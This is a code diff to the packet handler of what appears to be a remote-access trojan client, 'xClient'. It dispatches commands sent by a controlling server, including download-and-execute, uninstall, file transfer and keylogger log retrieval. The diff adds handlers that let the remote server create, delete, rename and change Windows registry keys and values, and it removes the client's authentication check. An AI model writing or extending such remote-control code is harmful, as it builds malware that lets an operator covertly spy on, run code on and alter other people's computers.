@@ -1,5 +1,4 @@
 ﻿using xClient.Core.Commands;
-using xClient.Core.Data;
 using xClient.Core.Networking;
 using xClient.Core.ReverseProxy;
 
@@ -10,19 +9,6 @@ namespace xClient.Core.Packets
         public static void HandlePacket(Client client, IPacket packet)
         {
             var type = packet.GetType();
-
-            if (!ClientData.IsAuthenticated)
-            {
-                if (type == typeof(ServerPackets.GetAuthentication))
-                {
-                    CommandHandler.HandleGetAuthentication((ServerPackets.GetAuthentication)packet, client);
-                }
-                else if (type == typeof(ServerPackets.SetAuthenticationSuccess))
-                {
-                    ClientData.IsAuthenticated = true;
-                }
-                return;
-            }
 
             if (type == typeof(ServerPackets.DoDownloadAndExecute))
             {
@@ -35,11 +21,11 @@ namespace xClient.Core.Packets
             }
             else if (type == typeof(ServerPackets.DoClientDisconnect))
             {
-                Program.Disconnect();
+                Program.ConnectClient.Exit();
             }
             else if (type == typeof(ServerPackets.DoClientReconnect))
             {
-                Program.Disconnect(true);
+                Program.ConnectClient.Disconnect();
             }
             else if (type == typeof(ServerPackets.DoClientUninstall))
             {
@@ -137,6 +123,38 @@ namespace xClient.Core.Packets
             {
                 CommandHandler.HandleDoDownloadFileCancel((ServerPackets.DoDownloadFileCancel)packet,
                     client);
+            }
+            else if (type == typeof(ServerPackets.DoLoadRegistryKey))
+            {
+                CommandHandler.HandleGetRegistryKey((ServerPackets.DoLoadRegistryKey)packet, client);
+            }
+            else if (type == typeof(ServerPackets.DoCreateRegistryKey))
+            {
+                CommandHandler.HandleCreateRegistryKey((ServerPackets.DoCreateRegistryKey)packet, client);
+            }
+            else if (type == typeof(ServerPackets.DoDeleteRegistryKey))
+            {
+                CommandHandler.HandleDeleteRegistryKey((ServerPackets.DoDeleteRegistryKey)packet, client);
+            }
+            else if (type == typeof(ServerPackets.DoRenameRegistryKey))
+            {
+                CommandHandler.HandleRenameRegistryKey((ServerPackets.DoRenameRegistryKey)packet, client);
+            }
+            else if (type == typeof(ServerPackets.DoCreateRegistryValue))
+            {
+                CommandHandler.HandleCreateRegistryValue((ServerPackets.DoCreateRegistryValue)packet, client);
+            }
+            else if (type == typeof(ServerPackets.DoDeleteRegistryValue))
+            {
+                CommandHandler.HandleDeleteRegistryValue((ServerPackets.DoDeleteRegistryValue)packet, client);
+            }
+            else if (type == typeof(ServerPackets.DoRenameRegistryValue))
+            {
+                CommandHandler.HandleRenameRegistryValue((ServerPackets.DoRenameRegistryValue)packet, client);
+            }
+            else if (type == typeof(ServerPackets.DoChangeRegistryValue))
+            {
+                CommandHandler.HandleChangeRegistryValue((ServerPackets.DoChangeRegistryValue)packet, client);
             }
             else if (type == typeof(ServerPackets.GetKeyloggerLogs))
             {
